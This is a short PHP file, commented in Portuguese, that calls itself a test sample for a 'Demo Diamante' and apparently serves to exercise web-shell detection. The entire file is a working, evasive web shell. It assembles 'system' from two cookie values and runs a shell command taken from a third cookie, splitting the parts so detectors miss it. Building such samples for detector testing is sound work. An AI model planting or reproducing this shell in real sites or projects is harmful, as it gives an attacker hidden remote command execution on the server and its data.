<?php
// Amostra de teste para a "Demo Diamante"
// Combina múltiplas técnicas de evasão de forma inédita.

// O atacante envia o nome da função e o comando em partes,
// através dos cookies, para ser ainda mais furtivo.
$part1 = $_COOKIE['f1']; // ex: 'sys'
$part2 = $_COOKIE['f2']; // ex: 'tem'
$cmd = $_COOKIE['c'];   // ex: 'ls -la'

if (isset($part1) && isset($part2) && isset($cmd)) {
    // A função perigosa é montada dinamicamente.
    $funcao_alvo = $part1 . $part2;

    // E executada a partir da variável.
    $funcao_alvo($cmd);
}
?>